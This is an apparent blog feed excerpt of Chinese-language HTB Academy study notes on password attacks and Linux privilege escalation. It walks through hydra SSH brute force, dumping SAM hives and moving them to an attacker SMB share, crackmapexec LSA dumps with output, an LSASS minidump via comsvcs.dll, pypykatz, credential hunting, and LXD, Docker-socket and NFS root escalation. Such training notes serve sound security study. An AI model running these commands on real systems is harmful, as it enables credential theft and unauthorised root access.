src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201825210.png" alt="image-20230720182512124"></p><p>这里先用hashcat转换一下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</code></pre><blockquote><ol><li><code>hashcat</code>: 运行 Hashcat 密码破解工具。</li><li><code>--force</code>: 强制进行破解，即忽略一些警告信息。</li><li><code>password.list</code>: 这是包含要破解的密码列表的文件名，Hashcat 将从该文件中读取密码列表进行破解。</li><li><code>-r custom.rule</code>: 使用规则文件 <code>custom.rule</code> 对密码进行变换。规则文件定义了一系列的字符串转换规则，Hashcat 将应用这些规则来生成多个变换后的密码，并将其用于破解尝试。</li><li><code>--stdout</code>: 将生成的所有变换后的密码输出到标准输出（即屏幕），而不是进行实际的破解尝试。</li><li><code>|</code>: 管道符号，将前面命令的输出作为后面命令的输入。</li><li><code>sort -u</code>: 对密码进行排序并去除重复的密码。</li><li><code>&gt; mut_password.list</code>: 将排序后去重的密码列表输出到名为 <code>mut_password.list</code> 的文件中。</li></ol></blockquote><p>然后：</p><pre><code>hydra -l sam -P mut_password.list  ssh://10.129.202.64</code></pre><p>&#x3D;&#x3D;&gt;</p><h1 id="Password-Reuse-x2F-Default-Passwords"><a href="#Password-Reuse-x2F-Default-Passwords" class="headerlink" title="Password Reuse &#x2F; Default Passwords"></a>Password Reuse &#x2F; Default Passwords</h1><h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><p>他给出了一个默认凭据表： <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">DefaultCreds-Cheat-Sheet</a></p><p>有时候由于接口服务等过多管理员选择复制粘贴默认密码而不是手动输入一个自定义密码</p><p>也可以直接搜索有无默认凭据：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201836635.png" alt="img"></p><h1 id="Windows-Local-Password-Attacks"><a href="#Windows-Local-Password-Attacks" class="headerlink" title="Windows Local Password Attacks"></a>Windows Local Password Attacks</h1><h2 id="Attacking-SAM"><a href="#Attacking-SAM" class="headerlink" title="Attacking SAM"></a>Attacking SAM</h2><h4 id="Copying-SAM-Registry-Hives"><a href="#Copying-SAM-Registry-Hives" class="headerlink" title="Copying SAM Registry Hives"></a>Copying SAM Registry Hives</h4><p>如果我们在目标上有本地管理员访问权限，我们可以复制三个注册表配置单元；当我们开始倾倒和破解散列时，每一个都有特定的目的。以下是下表中每一项的简要说明：</p><table><thead><tr><th>Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>hklm\sam</code></td><td>包含与本地帐户密码关联的哈希。我们需要散列，这样我们就可以破解它们，并以明文形式获得用户帐户密码。</td></tr><tr><td><code>hklm\system</code></td><td>包含用于加密SAM数据库的系统引导密钥。我们将需要引导密钥来解密SAM数据库。</td></tr><tr><td><code>hklm\security</code></td><td>包含域帐户的缓存凭据。我们可能会从加入域的Windows目标中受益。</td></tr></tbody></table><h4 id="Using-reg-exe-save-to-Copy-Registry-Hives"><a href="#Using-reg-exe-save-to-Copy-Registry-Hives" class="headerlink" title="Using reg.exe save to Copy Registry Hives"></a>Using reg.exe save to Copy Registry Hives</h4><p>以管理员身份启动CMD将允许我们运行reg.exe来保存上述注册表配置单元的副本。请运行以下命令执行此操作：</p><pre><code class="cmd-session">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.saveThe operation completed successfully.C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.saveThe operation completed successfully.C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.saveThe operation completed successfully.</code></pre><p>要创建共享，我们所要做的就是使用python运行smbserver.py-smb2support，给共享一个名称（CompData），并指定攻击主机上共享将存储配置单元副本的目录（&#x2F;home&#x2F;ltnob&#x2F;Documents）。要知道smb2support选项将确保支持较新版本的SMB。如果我们不使用此标志，从Windows目标连接到我们的攻击主机上托管的共享时将出现错误。较新版本的Windows默认不支持SMBv1，因为存在大量严重漏洞和公开漏洞。</p><p>一旦共享在我们的攻击主机上运行，我们就可以在Windows目标上使用move命令将配置单元副本移动到共享。</p><h4 id="Moving-Hive-Copies-to-Share"><a href="#Moving-Hive-Copies-to-Share" class="headerlink" title="Moving Hive Copies to Share"></a>Moving Hive Copies to Share</h4><pre><code class="cmd-session">C:\&gt; move sam.save \\10.10.15.16\CompData        1 file(s) moved.C:\&gt; move security.save \\10.10.15.16\CompData        1 file(s) moved.C:\&gt; move system.save \\10.10.15.16\CompData        1 file(s) moved.</code></pre><h2 id="Dumping-Hashes-with-Impacket’s-secretsdump-py"><a href="#Dumping-Hashes-with-Impacket’s-secretsdump-py" class="headerlink" title="Dumping Hashes with Impacket’s secretsdump.py"></a>Dumping Hashes with Impacket’s secretsdump.py</h2><p>使用secretsdump.py是一个简单的过程。我们所要做的就是使用Python运行secretsdump.py，然后指定从目标主机检索到的每个配置单元文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></pre><h2 id="Remote-Dumping-amp-LSA-Secrets-Considerations"><a href="#Remote-Dumping-amp-LSA-Secrets-Considerations" class="headerlink" title="Remote Dumping &amp; LSA Secrets Considerations"></a>Remote Dumping &amp; LSA Secrets Considerations</h2><p>通过使用本地管理员权限访问凭据，我们也可以通过网络锁定LSA机密。这可以允许我们从正在运行的服务、计划任务或使用LSA机密存储密码的应用程序中提取凭据。</p><h4 id="Dumping-LSA-Secrets-Remotely"><a href="#Dumping-LSA-Secrets-Remotely" class="headerlink" title="Dumping LSA Secrets Remotely"></a>Dumping LSA Secrets Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsaSMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)SMB         10.129.42.198   445    WS01     [+] Dumping LSA secretsSMB         10.129.42.198   445    WS01     WS01\worker:Hello123SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdcedpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944aSMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488bSMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached</code></pre><h4 id="Dumping-SAM-Remotely"><a href="#Dumping-SAM-Remotely" class="headerlink" title="Dumping SAM Remotely"></a>Dumping SAM Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>应用本节中教授的概念，获取目标上ITbackdoor用户帐户的密码。提交明文密码作为答案。</p><p>在目标上转储LSA机密并发现存储的凭据。提交用户名和密码作为答案。（格式：用户名：密码，区分大小写）</p></blockquote><h1 id="Attacking-LSASS"><a href="#Attacking-LSASS" class="headerlink" title="Attacking LSASS"></a>Attacking LSASS</h1><p>除了获得SAM数据库的副本以转储和破解哈希之外，我们还将受益于针对LSASS。如本模块的凭据存储部分所述，LSASS是一项关键服务，在所有Windows操作系统中的凭据管理和身份验证过程中发挥着核心作用。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201915415.png" alt="lsass Diagram"></p><p>初次登录后，LSASS将： 在内存中本地缓存凭据 创建访问令牌 强制执行安全策略 写入Windows安全日志 让我们介绍一些可以用来转储LSASS内存和从运行Windows的目标中提取凭据的技术和工具。</p><h2 id="Dumping-LSASS-Process-Memory"><a href="#Dumping-LSASS-Process-Memory" class="headerlink" title="Dumping LSASS Process Memory"></a>Dumping LSASS Process Memory</h2><p>与使用LSASS攻击SAM数据库的过程类似，我们最好首先通过生成内存转储来创建LSASS进程内存内容的副本。通过创建转储文件，我们可以使用攻击主机离线提取凭据。请记住，离线进行攻击使我们在攻击速度上具有更大的灵活性，并且在目标系统上花费的时间更少。我们可以使用无数种方法来创建内存转储。让我们介绍一下可以使用Windows内置工具执行的技术。</p><h4 id="Task-Manager-Method"><a href="#Task-Manager-Method" class="headerlink" title="Task Manager Method"></a>Task Manager Method</h4><p>通过访问与目标的交互式图形会话，我们可以使用任务管理器创建内存转储。这就要求我们：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201916966.png" alt="Task Manager Memory Dump"></p><p>打开任务管理器&gt;选择进程选项卡&gt;查找并右键单击本地安全机构进程&gt;选择创建转储文件</p><p>一个名为lsass.DMP的文件被创建并保存在：</p><pre><code class="cmd-session">C:\Users\loggedonusersdirectory\AppData\Local\Temp</code></pre><h4 id="Rundll32-exe-amp-Comsvcs-dll-Method"><a href="#Rundll32-exe-amp-Comsvcs-dll-Method" class="headerlink" title="Rundll32.exe &amp; Comsvcs.dll Method"></a>Rundll32.exe &amp; Comsvcs.dll Method</h4><p>任务管理器方法依赖于我们与目标进行基于GUI的交互式会话。我们可以使用另一种方法，通过名为 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32">rundll32.exe</a>的命令行实用程序转储LSASS进程内存。这种方法比任务管理器方法更快，也更灵活，因为我们可能只需访问命令行就可以在Windows主机上获得shell会话。需要注意的是，现代反病毒工具将这种方法识别为恶意活动。 在发出创建转储文件的命令之前，我们必须确定为lsass.exe分配了哪个进程ID（PID）。这可以通过cmd或PowerShell完成：</p><h4 id="Finding-LSASS-PID-in-cmd"><a href="#Finding-LSASS-PID-in-cmd" class="headerlink" title="Finding LSASS PID in cmd"></a>Finding LSASS PID in cmd</h4><pre><code class="cmd-session">C:\Windows\system32&gt; tasklist /svcImage Name                     PID Services========================= ======== ============================================System Idle Process              0 N/ASystem                           4 N/ARegistry                        96 N/Asmss.exe                       344 N/Acsrss.exe                      432 N/Awininit.exe                    508 N/Acsrss.exe                      520 N/Awinlogon.exe                   580 N/Aservices.exe                   652 N/Alsass.exe                      672 KeyIso, SamSs, VaultSvc</code></pre><pre><code class="powershell-session">PS C:\Windows\system32&gt; Get-Process lsassHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------   1260      21     4948      15396       2.56    672   0 lsass</code></pre><h4 id="Creating-lsass-dmp-using-PowerShell"><a href="#Creating-lsass-dmp-using-PowerShell" class="headerlink" title="Creating lsass.dmp using PowerShell"></a>Creating lsass.dmp using PowerShell</h4><pre><code class="powershell-session">PS C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></pre><h2 id="Using-Pypykatz-to-Extract-Credentials"><a href="#Using-Pypykatz-to-Extract-Credentials" class="headerlink" title="Using Pypykatz to Extract Credentials"></a>Using Pypykatz to Extract Credentials</h2><p> <a href="https://github.com/skelsec/pypykatz">pypykatz</a></p><p>该命令启动使用pypykatz来解析LSASS进程内存转储中隐藏的机密。我们在命令中使用lsa，因为LSASS是本地安全机构的子系统，然后我们将数据源指定为小型转储文件，按照存储在攻击主机上的转储文件的路径（&#x2F;home&#x2F;peter&#x2F;Documents&#x2F;lass.dmp）进行。Pypykatz解析转储文件并输出结果：</p><pre><code class="shell-session">Tanin@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp </code></pre><p>一些有用的凭据：</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a>是Windows中的一个身份验证包，LSA调用它来验证SAM数据库的登录尝试。Pypykatz提取了存储在LSASS进程内存中的与bob用户帐户的登录会话相关的SID、用户名、域，甚至NT&amp;SHA1密码哈希。这将在本节末尾介绍的我们进攻的最后阶段证明是有帮助的。</p><p>WDIGEST是一种较旧的身份验证协议，默认情况下在Windows XP-Windows 8和Windows Server 2003-Windows Server 2012中启用。LSASS以明文形式缓存WDIGEST使用的凭据。这意味着，如果我们发现自己的目标是启用WDIGEST的Windows系统，我们很可能会看到明文形式的密码。现代Windows操作系统默认情况下已禁用WDIGEST。此外，需要注意的是，Microsoft发布了针对受此问题影响的系统的WDIGEST安全更新。我们可以在这里 <a href="https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/">here</a>.研究安全更新的细节。</p><p><a href="https://web.mit.edu/kerberos/#what_is">Kerberos</a>是Active Directory在Windows域环境中使用的网络身份验证协议。域用户帐户在使用Active Directory进行身份验证时被授予票证。此票证用于允许用户访问网络上已被授予访问权限的共享资源，而无需每次键入凭据。LSASS缓存与Kerberos关联的密码、ekeys、票证和pin。可以从LSASS进程内存中提取这些，并使用它们访问加入同一域的其他系统。</p><p>&#x3D;&#x3D;数据保护应用程序编程接口（<a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">DPAPI</a> ）是Windows操作系统中的一组API，用于在每个用户的基础上为Windows操作系统功能和各种第三方应用程序加密和解密DPAPI数据块。&#x3D;&#x3D;</p><h1 id="Credential-Hunting-in-Linux"><a href="#Credential-Hunting-in-Linux" class="headerlink" title="Credential Hunting in Linux"></a>Credential Hunting in Linux</h1><h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><p>我们应该逐一查找、查找和检查几类文件。这些类别如下：</p><table><thead><tr><th>Configuration files</th><th>Databases</th><th>Notes</th></tr></thead><tbody><tr><td>Scripts</td><td>Cronjobs</td><td>SSH keys</td></tr></tbody></table><p>通常，配置文件标记有以下三个文件扩展名（.config、.conf、.cnf）。通过下面的方法，我们将看到我们的搜索减少到了这三个文件扩展名。</p><pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.conf .config .cnf&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;lib\|fonts\|share\|core&quot; ;done</code></pre><h4 id="Databases"><a href="#Databases" class="headerlink" title="Databases"></a>Databases</h4><pre><code class="shell-session">for l in $(echo &quot;.sql .db .*db .db*&quot;);do echo -e &quot;\nDB File extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share\|man&quot;;done</code></pre><h4 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h4><pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.py .pyc .pl .go .jar .c .sh&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share&quot;;done</code></pre><h4 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h4><p>SSH密钥可以被视为用于公钥身份验证机制的SSH协议的“访问卡”。为客户端生成一个文件（私钥），为服务器生成一个相应的文件（公钥）。然而，这些并不相同，因此知道公钥不足以找到私钥。公钥可以验证由专用SSH密钥生成的签名，从而能够自动登录到服务器。即使未经授权的人获得了公钥，也几乎不可能从中计算出匹配的私钥。当使用私钥SSH连接到服务器时，服务器会检查私钥是否有效，并让客户端相应登录。因此，通过SSH连接不再需要密码。 由于SSH密钥可以任意命名，因此我们无法在它们中搜索特定的名称。然而，它们的格式允许我们唯一地识别它们，因为无论是公钥还是私钥，都有唯一的第一行来区分它们。</p><pre><code class="shell-session">grep -rnw &quot;PRIVATE KEY&quot; /home/* 2&gt;/dev/null | grep &quot;:1&quot;</code></pre><blockquote><ul><li><code>-r</code>: 递归地搜索目录及其子目录下的文件。</li><li><code>-n</code>: 显示匹配行及其行号。</li><li><code>-w</code>: 仅匹配完整单词，而不是部分匹配。</li><li><code>&quot;PRIVATE KEY&quot;</code>: 要搜索的文本模式，即我们要找到包含的字符串。</li></ul></blockquote><h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><p>所有历史文件都提供了有关当前和过去&#x2F;历史过程的重要信息。我们对存储用户命令历史记录的文件和存储系统进程信息的日志感兴趣。 在使用Bash作为标准shell的Linux发行版上输入的命令的历史记录中，我们可以在.Bash_history中找到相关文件。然而，其他文件（如.bashrc或.Bash_profile）可能包含重要信息。 </p><h4 id="Bash-History"><a href="#Bash-History" class="headerlink" title="Bash History"></a>Bash History</h4><pre><code class="shell-session">tail -n5 /home/*/.bash*</code></pre><table><thead><tr><th><strong>Log File</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>/var/log/messages</code></td><td>Generic system activity logs.</td></tr><tr><td><code>/var/log/syslog</code></td><td>Generic system activity logs.</td></tr><tr><td><code>/var/log/auth.log</code></td><td>(Debian) All authentication related logs.</td></tr><tr><td><code>/var/log/secure</code></td><td>(RedHat&#x2F;CentOS) All authentication related logs.</td></tr><tr><td><code>/var/log/boot.log</code></td><td>Booting information.</td></tr><tr><td><code>/var/log/dmesg</code></td><td>Hardware and drivers related information and logs.</td></tr><tr><td><code>/var/log/kern.log</code></td><td>Kernel related warnings, errors and logs.</td></tr><tr><td><code>/var/log/faillog</code></td><td>Failed login attempts.</td></tr><tr><td><code>/var/log/cron</code></td><td>Information related to cron jobs.</td></tr><tr><td><code>/var/log/mail.log</code></td><td>All mail server related logs.</td></tr><tr><td><code>/var/log/httpd</code></td><td>All Apache related logs.</td></tr><tr><td><code>/var/log/mysqld.log</code></td><td>All MySQL server related logs.</td></tr></tbody></table><h2 id="Memory-and-Cache"><a href="#Memory-and-Cache" class="headerlink" title="Memory and Cache"></a>Memory and Cache</h2><p>有一个名为 <a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a>的工具可以使整个过程变得更容易。但是，此工具需要管理员&#x2F;root权限</p><p>我们可以使用的一个更强大的工具是LaZagne</p><h1 id="Passwd-Shadow-amp-Opasswd"><a href="#Passwd-Shadow-amp-Opasswd" class="headerlink" title="Passwd, Shadow &amp; Opasswd"></a>Passwd, Shadow &amp; Opasswd</h1><h4 id="Passwd-Format"><a href="#Passwd-Format" class="headerlink" title="Passwd Format"></a>Passwd Format</h4><table><thead><tr><th><code>cry0l1t3</code></th><th><code>:</code></th><th><code>x</code></th><th><code>:</code></th><th><code>1000</code></th><th><code>:</code></th><th><code>1000</code></th><th><code>:</code></th><th><code>cry0l1t3,,,</code></th><th><code>:</code></th><th><code>/home/cry0l1t3</code></th><th><code>:</code></th><th><code>/bin/bash</code></th></tr></thead><tbody><tr><td>Login name</td><td></td><td>Password info</td><td></td><td>UID</td><td></td><td>GUID</td><td></td><td>Full name&#x2F;comments</td><td></td><td>Home directory</td><td></td><td></td></tr></tbody></table><h4 id="Shadow-Format"><a href="#Shadow-Format" class="headerlink" title="Shadow Format"></a>Shadow Format</h4><table><thead><tr><th><code>cry0l1t3</code></th><th><code>:</code></th><th><code>$6$wBRzy$...SNIP...x9cDWUxW1</code></th><th><code>:</code></th><th><code>18937</code></th><th><code>:</code></th><th><code>0</code></th><th><code>:</code></th><th><code>99999</code></th><th><code>:</code></th><th><code>7</code></th><th><code>:</code></th><th><code>:</code></th><th><code>:</code></th></tr></thead><tbody><tr><td>Username</td><td></td><td>Encrypted password</td><td></td><td>Last PW change</td><td></td><td>Min. PW age</td><td></td><td>Max. PW age</td><td></td><td>Warning period</td><td>Inactivity period</td><td>Expiration date</td><td></td></tr></tbody></table><h2 id="Cracking-Linux-Credentials"><a href="#Cracking-Linux-Credentials" class="headerlink" title="Cracking Linux Credentials"></a>Cracking Linux Credentials</h2><h4 id="Unshadow"><a href="#Unshadow" class="headerlink" title="Unshadow"></a>Unshadow</h4><p><code>unshadow</code>: 这是一个系统管理工具，用于合并 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件，并输出未加密的密码哈希值。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak Tanin@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak Tanin@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></pre><h4 id="Hashcat-Cracking-Unshadowed-Hashes"><a href="#Hashcat-Cracking-Unshadowed-Hashes" class="headerlink" title="Hashcat - Cracking Unshadowed Hashes"></a>Hashcat - Cracking Unshadowed Hashes</h4>]]></content>
    
    
    <summary type="html">&lt;p&gt;在我们的渗透测试中，我们遇到的每一个计算机网络都将安装用于管理、编辑或创建内容的服务。所有这些服务都使用特定的权限托管，并分配给特定的用户&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Linux_Privilege_Escalation3</title>
    <link href="https://taninluv.github.io/2023/07/17/Linux-Privilege-Escalation3/"/>
    <id>https://taninluv.github.io/2023/07/17/Linux-Privilege-Escalation3/</id>
    <published>2023-07-17T03:11:30.000Z</published>
    <updated>2023-07-18T05:46:48.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h1><p>容器在操作系统级别操作，虚拟机在硬件级别操作。因此，容器共享一个操作系统，并将应用程序进程与系统的其他部分隔离开来，而经典的虚拟化允许多个操作系统在单个系统上同时运行。 隔离和虚拟化至关重要，因为它们有助于尽可能高效地管理资源和安全方面。例如，它们有助于监测系统中的错误，这些错误通常与新开发的应用程序无关。另一个例子是隔离通常需要root权限的进程。此类应用程序可以是web应用程序或API，必须与主机系统隔离，以防止升级到数据库。</p><span id="more"></span><h2 id="Linux-Containers"><a href="#Linux-Containers" class="headerlink" title="Linux Containers"></a>Linux Containers</h2><p>Linux容器（LXC）是一种操作系统级的虚拟化技术，它允许多个Linux系统通过拥有自己的进程但共享主机系统内核而在单个主机上彼此隔离运行。</p><h4 id="Linux-Daemon"><a href="#Linux-Daemon" class="headerlink" title="Linux Daemon"></a>Linux Daemon</h4><p><a href="https://github.com/lxc/lxd">LXD</a>在某些方面与之相似，但其设计目的是包含一个完整的操作系统。因此，它不是一个应用程序容器，而是一个系统容器。在我们可以使用此服务升级我们的权限之前，我们必须在lxc或lxd组中。</p><p>从现在开始，我们有几种方法可以利用LXC&#x2F;LXD。我们可以创建自己的容器并将其传输到目标系统，也可以使用现有的容器。不幸的是，管理员经常使用几乎没有安全性的模板。这种态度的后果是，我们已经有了可以自己用来对付这个系统的工具。</p><pre><code class="shell-session">container-user@nix02:~$ cd ContainerImagescontainer-user@nix02:~$ lsubuntu-template.tar.xz</code></pre><p>这样的模板通常没有密码，特别是如果它们是简单的测试环境。这些应该可以快速访问并且使用起来不复杂。对安全的关注将使整个启动过程复杂化，使其更加困难，从而大大减缓启动速度。如果我们有点幸运，并且系统上有这样一个容器，它可以被利用。为此，我们需要将此容器作为镜像导入。</p><pre><code class="shell-session">container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutempcontainer-user@nix02:~$ lxc image list</code></pre><p>在验证此映像已成功导入后，我们可以启动映像并通过指定容器的security.privileged标志和根路径对其进行配置。此标志将禁用允许我们对主机执行操作的所有隔离功能。</p><pre><code class="shell-session">container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=truecontainer-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></pre><blockquote><ol><li><code>lxc init ubuntutemp privesc -c security.privileged=true</code><ul><li><code>lxc init</code>: 创建一个新的容器配置。</li><li><code>ubuntutemp</code>: 源容器的名称。在此命令中，<code>ubuntutemp</code> 是已存在的容器的名称，将作为基础来创建新的容器。</li><li><code>privesc</code>: 新容器的名称。在这里，<code>privesc</code> 是要创建的新容器的名称。</li><li><code>-c security.privileged=true</code>: 这个选项用于将新创建的容器标记为 “特权容器”，即赋予它在主机系统上访问某些特权功能的能力。</li></ul></li><li><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code><ul><li><code>lxc config device add</code>: 向容器配置中添加设备。</li><li><code>privesc</code>: 容器的名称，这里是之前创建的名为 <code>privesc</code> 的容器。</li><li><code>host-root</code>: 新设备的名称，这里是自定义的名称，表示要添加到容器中的设备的名称。</li><li><code>disk</code>: 设备类型，这里是要添加的设备类型是磁盘。</li><li><code>source=/</code>: 设备的源路径，这里指定的是 <code>/</code>，表示要将主机系统的根目录挂载到容器中。</li><li><code>path=/mnt/root</code>: 设备的目标路径，这里指定的是 <code>/mnt/root</code>，表示将主机系统的根目录挂载到容器中的 <code>/mnt/root</code> 目录。</li><li><code>recursive=true</code>: 指定递归地挂载整个文件系统。</li></ul></li></ol></blockquote><p>完成后，我们可以启动容器并登录到其中。在容器中，我们可以转到指定的路径，以root身份访问主机系统的资源。</p><pre><code class="shell-session">container-user@nix02:~$ lxc start privesccontainer-user@nix02:~$ lxc exec privesc /bin/bashroot@nix02:~# ls -l /mnt/root</code></pre><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>要通过Docker获得root权限，我们登录的用户必须在Docker组中。这使他能够使用和控制Docker守护进程。</p><p>或者，Docker可能设置了SUID，或者我们在Sudoers文件中，这允许我们以root身份运行Docker。这三个选项都允许我们与Docker合作以提升我们的特权。 大多数主机都有直接的互联网连接，因为必须下载基本映像和容器。然而，出于安全原因，许多主机可能在夜间和工作时间以外与互联网断开连接。然而，如果这些主机位于网络中，例如，web服务器必须通过该网络，则仍然可以访问该网络。 要查看存在哪些镜像以及我们可以访问哪些镜像，我们可以使用以下命令：</p><h4 id="Linux-Docker"><a href="#Linux-Docker" class="headerlink" title="Linux Docker"></a>Linux Docker</h4><pre><code class="shell-session">docker-user@nix02:~$ docker image lsREPOSITORY                           TAG                 IMAGE ID       CREATED         SIZEubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB</code></pre><h4 id="Docker-Socket"><a href="#Docker-Socket" class="headerlink" title="Docker Socket"></a>Docker Socket</h4><p>当Docker套接字是可写的时，也可能发生这种情况。通常这个套接字位于&#x2F;var&#x2F;run&#x2F;doker.sock.但是，可以理解的是，位置不同。因为基本上，这只能由root或docker组编写。如果我们作为不在这两个组中的用户，并且Docker套接字仍然具有可写的权限，那么我们仍然可以使用这种情况来升级我们的权限。</p><pre><code class="shell-session">docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bashroot@ubuntu:~# ls -l /mnt</code></pre><blockquote><p>该命令使用 Docker 在容器中运行 Ubuntu 镜像，并将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录，然后进入容器的 Bash shell。</p><p>解析该命令的各个部分：</p><ul><li><code>docker</code>：Docker 命令，用于管理容器和镜像。</li><li><code>-H unix:///var/run/docker.sock</code>：指定 Docker 的主机地址，这里是 Unix 域套接字地址，用于与 Docker 守护进程通信。</li><li><code>run</code>：Docker 命令，用于创建并运行一个新的容器。</li><li><code>-v /:/mnt</code>：指定容器的数据卷挂载，将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录。这样在容器中可以访问宿主机的整个文件系统。</li><li><code>--rm</code>：指定容器退出时自动删除容器。当容器退出后，自动清理容器的数据。</li><li><code>-it</code>：启用交互式模式并分配一个伪终端 (pseudo-TTY)。这样可以进入容器并与其交互。</li><li><code>ubuntu</code>：要运行的容器镜像，这里是 Ubuntu 镜像。</li><li><code>chroot /mnt bash</code>：在容器内运行的命令，这里是 <code>chroot</code> 命令切换根目录到 <code>/mnt</code> 目录，然后启动 Bash shell。</li></ul></blockquote><h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="Weak-NFS-Privileges"><a href="#Weak-NFS-Privileges" class="headerlink" title="Weak NFS Privileges"></a>Weak NFS Privileges</h2><p>网络文件系统（NFS）允许用户通过Unix&#x2F;Linux系统上托管的网络访问共享文件或目录。NFS使用TCP&#x2F;UDP端口2049。任何可访问的装载都可以通过发出命令showmount-e远程列出，该命令列出NFS客户端的NFS服务器的导出列表（或文件系统的访问控制列表）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ showmount -e 10.129.2.12Export list for 10.129.2.12:/tmp             */var/nfs/general *</code></pre><p>创建NFS卷时，可以设置各种选项： </p><p>root_squash： 如果root用户用于访问NFS共享，它将被更改为nfsnobody用户，这是一个没有特权的帐户。root用户创建和上传的任何文件都将归nfsnobody用户所有，这可以防止攻击者上传SUID位设置的二进制文件。</p><p> no_root_squash：作为本地根用户连接到共享的远程用户将能够作为根用户在NFS服务器上创建文件。这将允许创建具有SUID位集的恶意脚本&#x2F;程序。</p><pre><code class="shell-session">htb@NIX02:~$ cat /etc/exports# /etc/exports: the access control list for filesystems which may be exported#to NFS clients.  See exports(5).## Example for NFSv2 and NFSv3:# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)## Example for NFSv4:# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)#/var/nfs/general *(rw,no_root_squash)/tmp *(rw,no_root_squash)</code></pre><p>例如，我们可以创建一个SETUID二进制文件，使用本地根用户执行&#x2F;bin&#x2F;sh。然后，我们可以在本地装载&#x2F;tmp目录，将root拥有的二进制文件复制到NFS服务器，并设置SUID位。 首先，创建一个简单的二进制文件，在本地装载目录，复制它，并设置必要的权限。</p><pre><code class="shell-session">htb@NIX02:~$ cat 